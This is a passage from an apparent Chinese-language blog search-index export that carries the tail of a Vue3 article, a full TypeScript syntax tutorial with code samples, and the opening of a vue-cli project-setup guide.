index.ts │ ├── shims-vue.d.ts │ ├── store │ │ └── index.ts │ ├── types │ │ └── movie.ts │ └── views │ ├── About.vue │ ├── Detail.vue │ ├── Home.vue │ ├── List.vue │ └── components │ ├── ListItem.vue │ └── TestInject.vue └── tsconfig.json 五、源码 example源码地址: vue3-ts\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/vue3-composition-api-and-main-attrs/","summary":"\u003cp\u003e本文是vue3+ts项目系列第3篇《vue3组合式api及重要属性变更》，会\u0026hellip;\u003c/p\u003e","title":"vue3+ts(3)：vue3组合式api及重要属性变更"},{"content":"本文是vue3+ts项目系列第2篇《TypeScript 语法汇总》，关于TypeScript的基础语法，你了解\u0026hellip;\n一、背景 在 react 和 vue 社区中也越来越多人开始使用TypeScript，使用 TS 可以增加代码的可读性和可维护性。从发布的 Vue3 正式版本来看， Vue3 的源码是用 TS 编写的，更好的 TypeScript 支持也是这次升级的一大亮点。当然，在实际开发中如何正确拥抱 TS 以及如何迁移到 Vue3 也是项目中我们不得不面对的问题，这里针对 Vue3 和 TS单独做了一个系列和大家做一下交流，本篇是 vue3+ts项目系列第2篇《TypeScript 语法汇总》。\n本系列其他内容如下:\nvue3+ts项目系列第1篇《vue3项目从0到1搭建》 vue3+ts项目系列第2篇《TypeScript 语法汇总》 vue3+ts项目系列第3篇《vue3组合式api及重要属性变更》 二、前言 1、静态类型、动态类型、强类型、弱类型 编译时就知道变量类型的是静态类型，运行时才知道一个变量类型的叫做动态类型。 java 是静态类型， js 是动态类型。\n不允许隐式转换的是强类型，允许隐式转换的是弱类型。 java 是强类型， js 是弱类型。\n那ts到底是什么类型的语言，很明显， ts 是静态类型语言，因为它需要经过编译。但是 ts不是强类型，因为它可以允许隐式类型转换。\nlet isBool: boolean let num: number = 10 isBool = !num // ok 2、Typescript是什么 ECMAScript 的超集 (stage 3) 编译期的类型检查 不引入额外开销(零依赖，不扩展 js 语法，不侵入运行时) 编译出通用的、易读的 js 代码 Typescript = Type + ECMAScript + Babel-Lite\nTypescript 设计目标: 链接\n3、为什么使用 Typescript 增加了代码的可读性和可维护性 减少运行时错误，写出的代码更加安全，减少 BUG 享受到代码提示带来的快感 重构神器 三、类型 1、基础类型 声明了变量的类型，那么这个变量就有了静态类型的特性，ts中使用:操作符来声明类型:\nboolean number string array tuple（元组） enum（枚举） any \u0026amp; unknown void null \u0026amp; undefined never Object 声明变量的类型:\nlet bool: boolean = false // boolean 类型 let num: number = 12 // number 类型 let str: string = \u0026#39;hello world\u0026#39; // string类型 let numArr: number[] = [1, 2, 3] // number数组类型 let numArr: Array\u0026lt;number\u0026gt; = [1, 2, 3] // 数组泛型形式：number数组类型 let unknow: any = 4 // any类型，即任一类型 unknow = \u0026#34;maybe a string instead\u0026#34; unknow = false 1.1 枚举（enum） 数字枚举 字符串枚举 常量枚举 很多编程语言都有枚举的概念，枚举就是一组常量的集合，但是和集合不同，枚举可以通过变量的值来得到变量，它是一个双向的过程:\nenum Direction { UP, DOWN, LEFT, RIGHT } Direction.UP // 0 Direction[0] // \u0026#39;UP\u0026#39; 数字枚举 上例中的 Direction 就是一个数字枚举，默认的，第一个变量的值是0，后面的值会在前一个值上 +1 ，所以 DOWN 的值为1， LEFT 的值为2，以此类推。 如果想改变枚举的初始值，只需要给第一个变量赋值即可:\nenum Direction { UP = 1, DOWN, LEFT, RIGHT } 字符串枚举 字符串枚举的概念很简单， 在一个字符串枚举里，每个成员都必须初始化:\n如果某个成员没有被初始化，则会报错\nenum Direction { UP = \u0026#39;UP\u0026#39;, DOWN = \u0026#39;DOWN\u0026#39;, LEFT = \u0026#39;LEFT\u0026#39;, RIGHT = \u0026#39;RIGHT\u0026#39;, MIDDLE //error 枚举成员必须具有初始化表达式 } 常量枚举 可以用 const 修饰符来声明枚举，这时候编译后的js代码将不会出现额外的声明代码:\nenum Direction { UP, DOWN, LEFT, RIGHT } const enum Seasons { SPRING = \u0026#39;SPRING\u0026#39;, SUMMER = \u0026#39;SUMMER\u0026#39;, AUTUMN = \u0026#39;AUTUMN\u0026#39;, WINTER = \u0026#39;WINTER\u0026#39; } const up = Direction.UP const spring = Seasons.SPRING 生成的js:\nvar Direction; (function (Direction) { Direction[Direction[\u0026#34;UP\u0026#34;] = 0] = \u0026#34;UP\u0026#34;; Direction[Direction[\u0026#34;DOWN\u0026#34;] = 1] = \u0026#34;DOWN\u0026#34;; Direction[Direction[\u0026#34;LEFT\u0026#34;] = 2] = \u0026#34;LEFT\u0026#34;; Direction[Direction[\u0026#34;RIGHT\u0026#34;] = 3] = \u0026#34;RIGHT\u0026#34;; })(Direction || (Direction = {})); var up = Direction.UP; var spring = \u0026#34;SPRING\u0026#34; /* SPRING */; 1.2 any 和 unknown 的区别 any : 任意类型 unknown : 未知的类型 任何类型都能分配给 unknown ，但 unknown 不能分配给其他基本类型，而 any 啥都能分配和被分配\nunknown Demo:\nlet foo: unknown foo = true // ok foo = 123 //ok foo.toFixed(2) // error let foo1: string = foo // error any Demo:\nlet bar: any bar = true // ok bar = 123 //ok foo.toFixed(2) // ok let bar1:string = bar // ok 如上，用了 any 就相当于完全丢失了类型检查，所以尽量少用 any ，对于未知类型可以用 unknown\nunknown 的正确用法 可以通过不同的方式将 unknown 类型缩小为更具体的类型范围:\nfunction getLen(value: unknown): number { if (typeof value === \u0026#39;string\u0026#39;) { // 因为类型保护的原因，此处 value 被判断为 string 类型 return value.length } return 0 } 这个过程叫类型收窄(type narrowing)\n1.3 never never 类型表示的是那些永不存在的值的类型。 never类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型；变量也可能是 never类型，当它们被永不为真的类型保护所约束时。\nnever 类型是任何类型的子类型，也可以赋值给任何类型 没有类型是never的子类型或可以赋值给never类型（除了never本身之外），即使 any也不可以赋值给never\n在最新的 typescript 3.7 中，下面代码会报错:\n// never 用户控制流分析 function neverReach (): never { throw new Error(\u0026#39;an error\u0026#39;) } const x = neverReach() x.toFixed(2) // x is unreachable never 还可以用于联合类型的幺元:\ntype T0 = string | number | never // T0 is string | number 2、高级类型 2.1 联合类型与交叉类型 联合类型(union type)表示多种类型的 “或” 关系\nfunction genLen(x: string | any[]) { return x.length } genLen(\u0026#39;\u0026#39;) // ok genLen([]) // ok genLen(1) // error 交叉类型表示多种类型的 “与” 关系\ninterface Person { name: string age: number } interface Animal { name: string color: string } const x: Person \u0026amp; Animal = { name: \u0026#39;x\u0026#39;, age: 1, color: \u0026#39;red } 使用联合类型表示枚举\ntype Position = \u0026#39;UP\u0026#39; | \u0026#39;DOWN\u0026#39; | \u0026#39;LEFT\u0026#39; | \u0026#39;RIGHT\u0026#39; const position: Position = \u0026#39;UP\u0026#39; // 具值联合类型 // type 关键词可以声明一个类型 type positionType = \u0026#39;top\u0026#39; | \u0026#39;center\u0026#39; | \u0026#39;bottom\u0026#39; let position: positionType = \u0026#39;top\u0026#39; // ok position = \u0026#39;left\u0026#39; // error 不能将类型“\u0026#34;left\u0026#34;”分配给类型“positionType” position = \u0026#39;bottom\u0026#39; // ok // 数组联合类型 let arr: (number | string)[] = [] arr.push(1) // ok arr.push(\u0026#39;hello\u0026#39;) // ok arr.push(true) // error 类型“true”的参数不能赋给类型“string | number”的参数。 可以避免使用 enum 侵入了运行时。\n2.2 类型保护和类型断言 ts 初学者很容易写出下面的代码:\nfunction isString (value) { return Object.prototype.toString.call(value) === \u0026#39;[object String]\u0026#39; } function fn (x: string | number) { if (isString(x)) { return x.length // error 类型“string | number”上不存在属性“length”。 } else { // ..... } } 如何让 ts 推断出来 x 是 string 类型呢?\n2.2.1 使用ts的 is 关键词 function isString (value: unknown): value is string { return Object.prototype.toString.call(value) === \u0026#39;[object String]\u0026#39; } function fn (x: string | number) { if (isString(x)) { return x.length } else { // ..... } } 2.2.2 类型保护 (1) js typeof 关键词 typeof 关系词可以从实现 推出类型，这是一个类型关键词\nfunction getLen(x: string | any[]) { return x.length } type GetLen = typeof getLen function callback(fn: GetLen) { fn(1) // 类型“1”的参数不能赋给类型“string | any[]”的参数 } (2) js instanceof 关键词 在 ts 中，instanceof 关键词能够帮助 ts 判断出构造函数的类型:\nfunction fn1 (x: XMLHttpRequest | string) { if (x instanceof XMLHttpRequest) { // x is XMLHttpRequest return x.getAllResponseHeaders() } else { // x is string return x.length } } (3) 针对 null 和 undefined 的类型保护 在条件判断中，ts 会自动对 null 和 undefined 进行类型保护:\nfunction fn2 (x?: string) { if (x) { return x.length } } 2.2.3 类型断言 (1) 针对 null 和 undefined 的类型断言 如果我们已经知道的参数不为空，可以使用!来手动标记:\nfunction fn2 (x?: string) { return x!.length } 2.3 索引类型（Index types） keyof in [] (1) keyof keyof 也是一个 类型关键词 ，可以用来取得一个对象接口的所有 key 值:\ninterface Person { name: string age: number } type PersonAttrs = keyof Person // \u0026#39;name\u0026#39; | \u0026#39;age\u0026#39; (2) in in 也是一个 类型关键词 ，可以对 联合类型 进行遍历，只可以用在 type 关键词下面。\ntype Person = { [key in \u0026#39;name\u0026#39; | \u0026#39;age\u0026#39;]: number } // ===\u0026gt; type Person = { name: number; age: number; } (3) [] 使用 [] 操作符可以进行索引访问，也是一个 类型关键词\ninterface Person { name: string age: number } type x = Person[\u0026#39;name\u0026#39;] // x is string 示例 写一个类型复制的类型工具:\ntype Copy\u0026lt;T\u0026gt; = { [key in keyof T]: T[key] } interface Person { name: string age: number } type Person1 = Copy\u0026lt;Person\u0026gt; 3、类型推断 ts 中的类型推断是非常强大，而且其内部实现也是非常复杂的。\n基本类型推断:\n// ts 推导出 x 是 number 类型 let x = 10 对象类型推断:\n// ts 推断出 myObj 的类型: myObj: { x: number; y: string; z: boolean; const myObj = { x:1, y: \u0026#39;2\u0026#39;, z: true } 函数类型推断:\n// ts 推导出函数返回值是 number 类型 function len (str: string) { return str.length } 上下文类型推断:\n// ts 推导出 event 是 ProgressEvent 类型 const xhr = new XMLHttpRequest() xhr.onload = function (event) {} 写 ts 代码的时候，对于基本类型我们可以不用手动声明其类型，让 ts 自己去推断\n知乎 - typescript上下文相关类型浅析 https://zhuanlan.zhihu.com/p/84481228\n4、类型兼容性 typescript 的子类型是基于 结构子类型 的，只要结构可以兼容，就是子类型。(Duck Type)\nclass Point { x: number } function getPointX(point: Point) { return point.x } class Point2 { x: number } let point2 = new Point2() getPointX(point2) // OK java 、 c++ 等传统静态类型语言是基于 名义子类型 的，必须显示声明子类型关系(继承)，才可以兼容。\npublic class Main { public static void main (String[] args) { getPointX(new Point()); // ok getPointX(new ChildPoint()); // ok getPointX(new Point1()); // error } public static void getPointX (Point point) { System.out.println(point.x); } static class Point { public int x = 1; } static class Point2 { public int x = 2; } static class ChildPoint extends Point { public int x = 3; } } 4.1 对象子类型 子类型中必须包含源类型所有的属性和方法:\nfunction getPointX(point: { x: number }) { return point.x } const point = { x: 1, y: \u0026#39;2\u0026#39; } getPointX(point) // OK 注意，如果直接传入一个对象字面量是会报错的:\nfunction getPointX(point: { x: number }) { return point.x } getPointX({ x: 1, y: \u0026#39;2\u0026#39; }) // error 这是 ts 中的另一个特性，叫做: excess property check ，当传入的参数是一个对象字面量时，会进行额外属性检查。\n4.2 协变与逆变 介绍类型兼容和类型安全就非常有必要介绍一下逆变与协变的概念:\n在介绍之前，先约定如下标记:\nA ≼ B 表示A是B的子类型，A包含B的所有属性和方法。 A =\u0026gt; B 表示以 A 为参数，B 为返回值的方法。 (param: A) =\u0026gt; B 一个问题 如果我现在有三个类型 Animal 、 Dog 、 WangCai(旺财) ，那么肯定存在下面的关系: WangCai ≼ Dog ≼ Animal 即 旺财属于狗属于动物。\n问题:以下哪种类型是 Dog =\u0026gt; Dog 的子类呢?\nWangCai =\u0026gt; WangCai WangCai =\u0026gt; Animal Animal =\u0026gt; Animal Animal =\u0026gt; WangCai 从代码来看 class Animal { sleep: Function } class Dog extends Animal { // 吠 bark: Function } class WangCai extends Dog { dance: Function } type DogCbFn = (dog: Dog) =\u0026gt; Dog function getDogName (cb: DogCbFn) { const dog = new Dog() const myDog = cb(dog) myDog.bark() } const animal = new Animal() const wangcai = new WangCai() getDogName(wangcai =\u0026gt; { wangcai.dance() return wangcai }) // error getDogName(wangcai =\u0026gt; { wangcai.dance() return animal }) // error getDogName(animal =\u0026gt; { animal.sleep() return wangcai }) // ok getDogName(animal =\u0026gt; { animal.sleep() return animal }) // error 可以看到只有 Animal =\u0026gt; WangCai 才是 Dog =\u0026gt; Dog 的子类型，可以得到一个结论，对于函数类型来说，函数参数的类型兼容是反向的，我们称之为 逆变 ，返回值的类型兼容是正向的，称之为 协变 。\n(1) 函数子类型 上面逆变与协变的例子介绍了函数参数只有一个时的情况，如果函数参数有多个时该如何区分?\n其实函数的参数可以转化为 Tuple 的类型兼容性:\ntype Tuple1 = [string, number] type Tuple2 = [string, number, boolean] let tuple1: Tuple1 = [\u0026#39;1\u0026#39;, 1] let tuple2: Tuple2 = [\u0026#39;1\u0026#39;, 1, true] let t1: Tuple1 = tuple2 // ok let t2: Tuple2 = tuple1 // error 可以看到 Tuple2 =\u0026gt; Tuple1 ，即长度大的是长度小的子类型，再由于函数参数的逆变特性，所以函数参数少的可以赋值给参数多的(参数从前往后需一一对应):\n[1, 2].forEach((item, index) =\u0026gt; { console.log(item) }) // ok [1, 2].forEach((item, index, arr, other) =\u0026gt; { console.log(other) }) // error 四、接口 写过java的同学应该都知道接口的概念，java中的接口是用来描述类的功能的\ninterface BabyInter { void cry(); } class Baby implements BabyInter { @Override public void cry() { System.out.print(\u0026#34;crying\u0026#34;) } } 但是ts里面的接口还是有一点不一样的，同样是用来描述数据的结构，ts的接口不仅可以描述类，还可以描述变量，描述方法, 使用interface关键词来声明接口:\ninterface BabyInter { name: string, cry () : void } let baby: BabyInter = { name: \u0026#39;apple\u0026#39;, cry () : void { console.log(this.name + \u0026#39;is crying\u0026#39;) } } let getBaby = () : BabyInter =\u0026gt; { return { name: \u0026#39;apple\u0026#39;, cry () {} } } 1、可选属性 接口里的属性不全都是必需的，可以是可选的。\ninterface FontStyleOptions { size: number; color?: string; } const getFontStyle = (options: FontStyleOptions) =\u0026gt; { options.color = options.color || \u0026#39;#000000\u0026#39; return options } const fontStyle = getFontStyle({ size: 16 }) 可选属性的好处之一是可以对可能存在的属性进行预定义，好处之二是在引用了不存在的属性时可以捕获错误。\n2、可索引的类型 额外的属性检查 如果FontStyleOptions接口中除了有size属性，还有一些不确定的其它属性，那么可以这样定义它:\ninterface FontStyleOptions { size: number; [prop: string]: number; } let obj: FontStyleOptions = { size: 16, border: 1 } obj.height = 18 // ok obj.background = \u0026#39;#ffffff\u0026#39; // error 不能将类型“\u0026#34;#ffffff\u0026#34;”分配给类型“number” 要注意的是，对于可索引的类型来说，索引签名的参数类型必须为 \u0026ldquo;string\u0026rdquo; 或 \u0026ldquo;number\u0026rdquo;:\ninterface FontStyleOptions { size: number; [prop: boolean]: string; // error } 这也很容易理解，因为对象的键值要么是字符串要么是数字。 还要注意的是，索引的类型必须是其他属性的联合类型:\ninterface FontStyleOptions { size: number; // error 类型“number”的属性“size”不能赋给字符串索引类型“string” [prop: string]: string; } interface FontStyleOptions { size: number; [prop: string]: string | number; // ok } 五、类 1、继承 class Animal { name: string; constructor(theName: string) { this.name = theName; } move(distanceInMeters: number = 0) { console.log(`${this.name} moved ${distanceInMeters}m.`); } } class Snake extends Animal { constructor(name: string) { super(name); } move(distanceInMeters = 5) { console.log(\u0026#34;Slithering...\u0026#34;); super.move(distanceInMeters); } } class Horse extends Animal { constructor(name: string) { super(name); } move(distanceInMeters = 45) { console.log(\u0026#34;Galloping...\u0026#34;); super.move(distanceInMeters); } } let sam = new Snake(\u0026#34;Sammy the Python\u0026#34;); let tom: Animal = new Horse(\u0026#34;Tommy the Palomino\u0026#34;); sam.move(); tom.move(34); 输出\nSlithering... Sammy the Python moved 5m. Galloping... Tommy the Palomino moved 34m. 关键点\n使用extends关键字创建了Animal的两个子类： Horse和 Snake 派生类包含了一个构造函数，它必须调用 super()，它会执行基类的构造函数。 而且，在构造函数里访问 this的属性之前，一定要调用 super() 重写从 Animal继承来的 move方法，使得 move方法根据不同的类而具有不同的功能 ts中的类和es6的类没有什么太大的区别，主要是增加了类成员和方法的修饰符(private, protected, public)和对接口的实现。\n2、修饰符 public 修饰符: 类成员和方法能在该类和该类的子类中被使用，也能在外部被使用。TypeScript里，成员都默认为 public private 修饰符: 类成员和方法只能在该类中被使用，不能在外部被使用。 protected 修饰符: 类成员和方法只能在该类和该类的子类中被使用，不能在外部被使用。 readonly关键字将属性设置为只读的，只读属性必须在声明时或构造函数里被初始化 class Person { private age: number protected name: string constructor (name: string, age: number) { this.name = name this.age = age } } class Student extends Person { constructor (name: string, age: number) { super(name, age) } learn () :void { console.log(this.name + \u0026#39;is learning\u0026#39;) // ok console.log(this.age) // error } } let student = new Student(\u0026#39;Lucy\u0026#39;, 18) student.name // error 注意 如果其中一个类型里包含一个 private成员，那么只有当另外一个类型中也存在这样一个 private成员， 并且它们都是来自同一处声明时，我们才认为这两个类型是兼容的。 对于 protected成员也使用这个规则\n3、存取器 通过getters/setters来截取对对象成员的访问。 它能帮助你有效的控制对对象成员的访问\nlet passcode = \u0026#34;secret passcode\u0026#34;; class Employee { private _fullName: string; get fullName(): string { return this._fullName; } set fullName(newName: string) { if (passcode \u0026amp;\u0026amp; passcode == \u0026#34;secret passcode\u0026#34;) { this._fullName = newName; } else { console.log(\u0026#34;Error: Unauthorized update of employee!\u0026#34;); } } } let employee = new Employee(); employee.fullName = \u0026#34;Bob Smith\u0026#34;; if (employee.fullName) { alert(employee.fullName); } 注意\n存取器要求将编译器设置为输出ECMAScript 5或更高。 不支持降级到ECMAScript 3 只带有 get不带有 set的存取器自动被推断为 readonly（这在从代码生成 .d.ts文件时是有帮助的，因为利用这个属性的用户会看到不允许够改变它的值） 4、静态属性 前面讨论了类的实例成员，那些仅当类被实例化的时候才会被初始化的属性。 我们也可以使用static关键词创建类的静态成员，这些属性存在于类本身上面而不是类的实例上\nclass Grid { static origin = {x: 0, y: 0}; calculateDistanceFromOrigin(point: {x: number; y: number;}) { let xDist = (point.x - Grid.origin.x); let yDist = (point.y - Grid.origin.y); return Math.sqrt(xDist * xDist + yDist * yDist) / this.scale; } constructor (public scale: number) { } } let grid1 = new Grid(1.0); // 1x scale let grid2 = new Grid(5.0); // 5x scale console.log(grid1.calculateDistanceFromOrigin({x: 10, y: 10})); console.log(grid2.calculateDistanceFromOrigin({x: 10, y: 10})); 5、抽象类 抽象类做为其它派生类的基类使用。一般不会直接被实例化 不同于接口，抽象类可以包含成员的实现细节 abstract关键字是用于定义抽象类和在抽象类内部定义抽象方法 抽象类中的抽象方法不包含具体实现并且必须在派生类中实现 abstract class Department { constructor(public name: string) { } printName(): void { console.log(\u0026#39;Department name: \u0026#39; + this.name); } abstract printMeeting(): void; // 必须在派生类中实现 } class AccountingDepartment extends Department { constructor() { super(\u0026#39;Accounting and Auditing\u0026#39;); // 在派生类的构造函数中必须调用 super() } printMeeting(): void { console.log(\u0026#39;The Accounting Department meets each Monday at 10am.\u0026#39;); } generateReports(): void { console.log(\u0026#39;Generating accounting reports...\u0026#39;); } } let department: AccountingDepartment = new AccountingDepartment(); // 允许对一个抽象子类进行实例化和赋值 department.printName(); department.printMeeting(); let department2: Department; // 允许创建一个对抽象类型的引用 department2 = new Department(); // 错误: 不能创建一个抽象类的实例 department2.generateReports(); // 错误: 方法在声明的抽象类中不存在 6、类和接口 ts中类可以使用关键词implements来实现接口:\ninterface BabyInter { name: string cry () : void } class Baby implements BabyInter { name: string constructor (name: string) { this.name = name } cry () :void { console.log(this.name + \u0026#39;is crying\u0026#39;) } } 如果 Baby 类中没有声明 cry 方法会怎样:\ninterface BabyInter { name: string cry () : void } class Baby implements BabyInter { name: string constructor (name: string) { this.name = name } } 会报一个编译错误: [ts] 类“Baby”错误实现接口“BabyInter”。类型“Baby”中缺少属性“cry”。\n六、函数 1、函数类型 (1) 几种函数类型的返回值类型写法 记住在 () 后面添加返回值类型即可\nfunction fn(): number { return 1 } const fn = function (): number { return 1 } const fn = (): number =\u0026gt; { return 1 } const obj = { fn (): number { return 1 } } (2) 函数类型 ts 中也有函数类型，用来描述一个函数:\ntype FnType = (x: number, y: number) =\u0026gt; number 完整的函数写法\nlet myAdd: (x: number, y: number) =\u0026gt; number = function(x: number, y: number): number { return x + y } // 使用 FnType let myAdd: FnType = function(x: number, y: number): number { return x + y } // ts 自动推导参数类型 let myAdd: FnType = function(x, y) { return x + y } 2、函数重载? js因为是动态类型，本身不需要支持重载，ts为了保证类型安全，支持了函数签名的类型重载。即:\n多个 重载签名 和一个 实现签名\nfunction len(s: string): string; function len(arr: any[]): number; function len(x: string | any[]) { if (typeof x === \u0026#39;string\u0026#39;) { return x.length.toString() } return x.length } let a = len(\u0026#39;\u0026#39;).trim() // error let b = len([]).toFixed(2) // ok let c = len(2) // error ts 函数重载的其他特性:\n如果定义了 重载签名 ，则 实现签名 对外不可见 实现签名 必须兼容 重载签名 重载签名 的类型不会合并 TS 中的函数重载其实并不是真的重载。\n七、泛型 1、什么是泛型 软件工程中，我们不仅要创建一致的定义良好的API，同时也要考虑代码块的重用性。 组件不仅能够支持当前的数据类型，同时也能支持未来的数据类型。\n通过字面意思来看，泛型有“广泛的类型”之意，即数据的类型也可以通过一个变量来动态确定，一般用 \u0026lt;\u0026gt; 操作符来声明泛型的使用。\n小试牛刀 // 泛型方法\nfunction createList\u0026lt;T\u0026gt;(): T[] { return [] as T[] } const numberList = createList\u0026lt;number\u0026gt;() // number[] const stringList = createList\u0026lt;string\u0026gt;() // string[] 2、泛型接口 interface GenericIdentityFn\u0026lt;T\u0026gt; { (arg: T): T; } function identity\u0026lt;T\u0026gt;(arg: T): T { return arg; } let myIdentity: GenericIdentityFn\u0026lt;number\u0026gt; = identity; 3、泛型类 // 泛型类的定义 class ArrayList\u0026lt;T\u0026gt; { list: T[] push (item: T) :void { this.list.push(item) } pop () :T { return this.list.pop() } } // 泛型类的使用 const list = new ArrayList\u0026lt;string\u0026gt;() list.push(\u0026#39;hello\u0026#39;) // ok list.push(1) //error 小知识:K，V，T，E等泛型名称不是固定写死了，是可以随意定义的，为了语义化，是有特殊含义的:\nT表示 type 类型。 K、V:分别代表键值中的 Key、Value。 E:表示 enum 枚举。 4、泛型约束 如果我们只希望 createList 函数只能生成指定的类型数组，该如何做，可以使用 extends 关键词来约束泛型的范围和形状。\n此时 extends 约束的是输入值\ninterface Lengthwise { length: number } function createList\u0026lt;T extends string | number | Lengthwise\u0026gt;(): T[] { return [] as T[] } const numberList = createList\u0026lt;number\u0026gt;() // ok const arrayList = createList\u0026lt;any[1, 2, 3]\u0026gt;() // ok const stringList = createList\u0026lt;boolean\u0026gt;() // error console.log(numberList) // [] console.log(arrayList) // [] 4.1 条件控制 extends 除了做约束类型，还可以做条件控制，相当于与一个三元运算符，只不过是针对类型的。\nT extends U ? X : Y 如果 T 可以被分配给 U，则返回 X，否则返回 Y。\ntype IsNumber\u0026lt;T\u0026gt; = T extends number ? true : false type x = IsNumber\u0026lt;string\u0026gt; // false 4.2 类型映射 类型映射相当与一个类型的函数，可以做一些类型运算，输入一个类型，输出另一个类型，前文我们举了个 Copy 的例子。\n(1) 内置的映射类型 // 每一个属性都变成可选 type Partial\u0026lt;T\u0026gt; = { [P in keyof T]?: T[P] } // 每一个属性都变成可选 type Readonly\u0026lt;T\u0026gt; = { readonly [P in keyof T]: T[P] } // 选则对象中的某些属性 type Pick\u0026lt;T, K extends keyof T\u0026gt; = { [P in K]: T[P]; } // ...... typescript 2.8 在 lib.d.ts 中内置了几个映射类型:\nExclude\u0026lt;T, U\u0026gt; \u0026ndash; 从 T 中剔除可以赋值给 U 的类型。 Extract\u0026lt;T, U\u0026gt; \u0026ndash; 提取 T 中可以赋值给 U 的类型。 NonNullable\u0026lt;T\u0026gt; \u0026ndash; 从 T 中剔除 null 和 undefined 。 ReturnType\u0026lt;T\u0026gt; \u0026ndash; 获取函数返回值类型。 InstanceType\u0026lt;T\u0026gt; \u0026ndash; 获取构造函数类型的实例类型。 (2) extends 条件分发 对于 T extends U ? X : Y 来说，还存在一个特性，当 T 是一个联合类型时，会进行条件分发。\ntype Union = string | number type ParamType\u0026lt;T\u0026gt; = T extends number ? \u0026#39;isNumber\u0026#39; : \u0026#39;isString\u0026#39; type UnionType = ParamType\u0026lt;Union\u0026gt; // \u0026#39;isNumber\u0026#39; | \u0026#39;isString\u0026#39; 实际上，extends 运算会变成如下形式:\n(string extends number ? \u0026#39;number\u0026#39; : \u0026#39;string\u0026#39;) | (number extends number ? \u0026#39;number\u0026#39; : \u0026#39;string\u0026#39;) Extract 就是基于此特性实现的，再配合 never 幺元的特性:\ntype Exclude\u0026lt;T, K\u0026gt; = T extends K ? never : T type T1 = Exclude\u0026lt;string | number | boolean, string | boolean\u0026gt; // number (3) infer 关键词 infer 关键词常在条件类型中和 extends 关键词一同出现，表示将要推断的类型，作为类型变量可以在三元表达式的 True 部分引用\nts 中内置的一个映射类型 ReturnType ，用于获取函数类型的返回值:\nfunction len (str: string) { return str.length } type LenFn = typeof len // (str: string) =\u0026gt; number type LenFnReturn = ReturnType\u0026lt;LenFn\u0026gt; // number ReturnType 的实现:\ntype ReturnType\u0026lt;T extends (...args: any) =\u0026gt; any\u0026gt; = T extends (...args: any) =\u0026gt; infer R ? R : any; 八、模块 1、全局模块 vs. 文件模块 默认情况下，我们所写的代码是位于全局模块下的:\nconst foo = 2 此时，如果我们创建了另一个文件，并写下如下代码，ts 认为是正常的:\nconst bar = foo // ok 如果要打破这种限制，只要文件中有 import 或者 export 表达式即可:\nexport const bar = foo // error 2、模块解析策略 Tpescript 有两种模块的解析策略: Node 和 Classic 。\n当 tsconfig.json 中 module 设置成 AMD、System、ES2015 时，默认为 classic ，否则为 Node ，也可以使用 moduleResolution 手动指定模块解析策略。\n两种模块解析策略的区别在于:\nimport { a } from \u0026#39;moduleB\u0026#39; Classic:\n/root/src/folder/moduleB.ts /root/src/folder/moduleB.d.ts /root/src/moduleB.ts /root/src/moduleB.d.ts /root/moduleB.ts /root/moduleB.d.ts /moduleB.ts /moduleB.d.ts Node:\n/root/src/node_modules/moduleB.ts /root/src/node_modules/moduleB.tsx /root/src/node_modules/moduleB.d.ts /root/src/node_modules/moduleB/package.json (如果指定了\u0026quot;types\u0026quot;属性) /root/src/node_modules/moduleB/index.ts /root/src/node_modules/moduleB/index.tsx /root/src/node_modules/moduleB/index.d.ts /root/node_modules/moduleB.ts /root/node_modules/moduleB.tsx /root/node_modules/moduleB.d.ts /root/node_modules/moduleB/package.json (如果指定了\u0026quot;types\u0026quot;属性) /root/node_modules/moduleB/index.ts /root/node_modules/moduleB/index.tsx /root/node_modules/moduleB/index.d.ts /node_modules/moduleB.ts /node_modules/moduleB.tsx /node_modules/moduleB.d.ts /node_modules/moduleB/package.json (如果指定了\u0026quot;types\u0026quot;属性) /node_modules/moduleB/index.ts /node_modules/moduleB/index.tsx /node_modules/moduleB/index.d.ts 参考:\n可参考文章-语雀 TypeScript官方文档 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/03.ts-basic-grammar/","summary":"\u003cp\u003e本文是vue3+ts项目系列第2篇《TypeScript 语法汇总》，关于\u003ccode\u003eTypeScript\u003c/code\u003e的基础语法，你了解\u0026hellip;\u003c/p\u003e","title":"vue3+ts(2)：TypeScript 语法汇总"},{"content":"本文是vue3+ts项目系列第1篇《vue3项目从0到1搭建》，主要涉及到\u0026hellip;\n一、背景 在 react 和 vue 社区中也越来越多人开始使用TypeScript，使用 TS 可以增加代码的可读性和可维护性。从发布的 Vue3 正式版本来看， Vue3 的源码是用 TS 编写的，更好的 TypeScript 支持也是这次升级的一大亮点。当然，在实际开发中如何正确拥抱 TS 以及如何迁移到 Vue3 也是项目中我们不得不面对的问题，这里针对 Vue3 和 TS单独做了一个系列和大家做一下交流，本篇是 vue3+ts项目系列第1篇《vue3项目从0到1搭建》\n本系列其他内容如下:\nvue3+ts项目系列第1篇《vue3项目从0到1搭建》 vue3+ts项目系列第2篇《TypeScript 语法汇总》 vue3+ts项目系列第3篇《vue3组合式api及重要属性变更》 二、官方 Quickstart 介绍 准备： vue3\n官方仓库 Quickstart 中推荐用两种方式方式来构建我们的 SPA 项目:\nvite vue-cli 1、vite vite 示例\nnpm init vite-app vue3-ts 打开 vite 依赖的 package.json 发现在 devDependencies 开发依赖里面已经引入了TypeScript ，甚至 vuex、vue-router、less、sass 这些经常需要用到的开发工具。\nvite 轻量，开箱即用的特点，满足了大部分开发场景的需求，作为快速启动本地 Vue 项目来说，可以说非常完美。\n2、vue-cli 官方文档vue-cli\nvue-cli 强调用 cli 的方式进行交互式的配置，选择起来更加灵活可控: 丰富的官方插件适配、GUI的创建管理界面、标准化开发流程。\nvue-cli示例\nnpm install -g @vue/cli vue create vue3-ts 三、项目搭建 本项目使用 vue-cli 搭建\n1、安装 npm install -g @vue/cli // 查看版本确认安装success vue --version 2、创建项目 也可以选择使用 vue ui 命令以图形化界面创建和管理项目\n// 创建 \u0026amp; 选择自定义模板、插件等 vue create vue3-ts 可以选择默认设置或者手动选择特性（这里选择手动选择特性）。\n默认设置 